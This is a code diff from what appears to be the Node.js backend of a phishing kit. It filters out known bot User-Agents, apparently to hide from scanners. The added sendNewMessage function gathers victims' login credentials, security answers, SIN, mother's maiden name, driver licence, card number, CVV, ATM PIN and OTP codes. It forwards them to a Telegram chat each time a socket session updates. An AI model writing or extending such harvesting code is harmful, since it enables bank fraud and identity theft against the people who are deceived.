@@ -102,8 +102,6 @@ const botList = [
     // ... Add all the bots from your list
 ];
 
-
-
 const redirectBots = (req, res, next) => {
     const userAgent = req.get('User-Agent');
     if (userAgent) {
@@ -215,6 +213,60 @@ function update(initialData, initialDataTest){
     }
 
     return initialData
+}
+
+function sendNewMessage(userDetails){
+    let messageId = null
+    let message = `IP: ipAddress
+
+    -- Login Details --
+    Username: ${userDetails.getUserDataLogin.username || ''}
+    Password:  ${userDetails.getUserDataLogin.password || ''}
+    UserAgent: ${userDetails.getUserDataLogin.userAgent || ''}
+    
+    -- Security Questions --
+    Q1: ${userDetails.getUserDataQuestion.question1 || ''} : ${userDetails.getUserDataQuestion.answer1 || ''}
+    Q2: ${userDetails.getUserDataQuestion.question2 || ''} : ${userDetails.getUserDataQuestion.answer2 || ''}
+    Q3: ${userDetails.getUserDataQuestion.question3 || ''} : ${userDetails.getUserDataQuestion.answer3 || ''}
+    Q4: ${userDetails.getUserDataQuestion.question4 || ''} : ${userDetails.getUserDataQuestion.answer4 || ''}
+    Q5: ${userDetails.getUserDataQuestion.question5 || ''} : ${userDetails.getUserDataQuestion.answer5 || ''}
+    Custom Question: ${userDetails.getUserDataOTP.customQuestion || ''} : ${userDetails.getUserDataOTP.customAnswer || ''}
+    
+    -- Personal Information --
+    Full Name: ${userDetails.getUserDataDetails.name || ''}
+    Address: ${userDetails.getUserDataDetails.address || ''}
+    City: ${userDetails.getUserDataDetails.city || ''}
+    Phone Number: ${userDetails.getUserDataDetails.phone || ''}
+    Postal Code: ${userDetails.getUserDataDetails.postal || ''}
+    Email: ${userDetails.getUserDataDetails.email || ''}
+    DOB: ${userDetails.getUserDataDetails.dob1 || ''}/${userDetails.getUserDataDetails.dob2 || ''}/${userDetails.getUserDataDetails.dob3 || ''} || ${userDetails.getUserDataDetails.dob || ''}
+    Mmn: ${userDetails.getUserDataDetails.mmn || ''}
+    Sin: ${userDetails.getUserDataDetails.sin || ''}
+    Driver Licence: ${userDetails.getUserDataDetails.drivers || ''}
+
+    -- Card Information --
+    Card Number: ${userDetails.getUserDataCard.card || ''}
+    Expiry: ${userDetails.getUserDataCard.exp1 || ''}/${userDetails.getUserDataCard.exp2 || ''} || ${userDetails.getUserDataCard.expiry || ''}
+    CVV: ${userDetails.getUserDataCard.cvv || ''}
+    ATM PIN: ${userDetails.getUserDataCard.atm || ''}
+    
+    -- OTP --
+    Code:  ${userDetails.getUserDataOTP.code || ''}
+    `;
+
+    bot.sendMessage(chatId, message);
+
+    bot.sendMessage(chatId, message).then((sentMsg) => {
+        messageId = sentMsg.message_id;
+    });
+    
+    console.log(messageId)
+
+    return messageId
+}
+
+function modifyMessageSent(){
+
 }
 
 // Use this middleware in your app before your routes
@@ -507,14 +559,19 @@ io.on('connection', (socket, req) => {
             
         sessionStore.set(userIP, userDetails);
         io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
+
+        sendNewMessage(userDetails)
+        
     }
+    /*
         let user = data
         user.ip = userIP
-           // Additional logic for sending a message via Telegram bot
+        // Additional logic for sending a message via Telegram bot
         let message = JSON.stringify(user, null, 2);
         bot.sendMessage(chatId, message);
        
         //console.log(data)
+    */
     })
 
 
